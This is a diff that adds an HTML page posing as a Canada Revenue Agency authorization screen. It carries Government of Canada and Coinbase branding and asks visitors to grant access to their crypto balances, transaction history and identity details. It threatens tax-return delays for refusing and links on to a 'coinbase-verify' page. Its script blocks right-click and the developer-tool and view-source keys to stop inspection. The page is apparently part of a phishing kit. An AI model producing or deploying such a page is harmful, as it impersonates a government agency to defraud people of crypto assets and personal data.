@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authorization Required - Canada.ca</title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Noto Sans', sans-serif;
+            background-color: #f5f5f5;
+        }
+        .auth-container {
+            max-width: 600px;
+            margin: 80px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 40px;
+        }
+        .btn-authorize {
+            width: 100%;
+            background-color: #4CAF50;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn-authorize:hover {
+            background-color: #45a049;
+        }
+        .permission-item {
+            padding: 12px 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .permission-item:last-child {
+            border-bottom: none;
+        }
+        .exchange-logo {
+            width: 100px;
+            height: 50px;
+            object-fit: contain;
+            margin: 0 auto 20px;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="flex items-center justify-between mb-6">
+            <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-en.svg" alt="Government of Canada" class="h-8">
+            <i class="fas fa-shield-alt text-gray-400 text-2xl"></i>
+        </div>
+
+        <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/coinbase-logo-icon.png" alt="Coinbase" class="exchange-logo">
+
+        <h1 class="text-2xl font-bold text-gray-800 mb-3">Authorization Required</h1>
+        <p class="text-gray-600 mb-2">The Canada Revenue Agency requires access to verify your crypto-asset transaction history and current holdings through <strong>Coinbase</strong>.</p>
+        <p class="text-sm text-gray-600 mb-6">Reference: Income Tax Act, Section 233.3</p>
+
+        <h2 class="text-lg font-bold text-gray-800 mb-3">Requested Permissions:</h2>
+        
+        <div class="bg-gray-50 rounded-lg p-4">
+            <div class="permission-item">
+                <i class="fas fa-check-circle text-green-600 mr-2"></i>
+                <strong>View account balance and holdings</strong>
+                <p class="text-sm text-gray-600 ml-6">Access to current cryptocurrency balances across all wallets</p>
+            </div>
+            <div class="permission-item">
+                <i class="fas fa-check-circle text-green-600 mr-2"></i>
+                <strong>Access transaction history</strong>
+                <p class="text-sm text-gray-600 ml-6">Complete record of deposits, withdrawals, trades, and transfers for tax years 2023-2025</p>
+            </div>
+            <div class="permission-item">
+                <i class="fas fa-check-circle text-green-600 mr-2"></i>
+                <strong>Verify identity information</strong>
+                <p class="text-sm text-gray-600 ml-6">Confirm account holder details match CRA records</p>
+            </div>
+            <div class="permission-item">
+                <i class="fas fa-check-circle text-green-600 mr-2"></i>
+                <strong>Review staking and rewards</strong>
+                <p class="text-sm text-gray-600 ml-6">Income from staking, lending, and promotional rewards (taxable income)</p>
+            </div>
+        </div>
+
+        <p class="text-sm text-gray-600 mt-6 mb-4">Authorization is required to proceed with your tax return. Failure to provide access may result in processing delays.</p>
+
+        <button onclick="authorize()" class="btn-authorize">
+            <i class="fas fa-check mr-2"></i> Authorize CRA Access
+        </button>
+
+        <div class="mt-4 text-center">
+            <a href="select-exchange.html" class="text-blue-600 text-sm hover:underline">
+                Cancel and return to exchange selection
+            </a>
+        </div>
+    </div>
+
+    <script>
+        function authorize() {
+            window.location.href = 'coinbase-verify.html';
+        }
+
+        // Anti-scraping protection
+        (function() {
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode == 123 || 
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 73) ||
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 74) ||
+                    (e.ctrlKey && e.keyCode == 85) ||
+                    (e.ctrlKey && e.keyCode == 83)) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
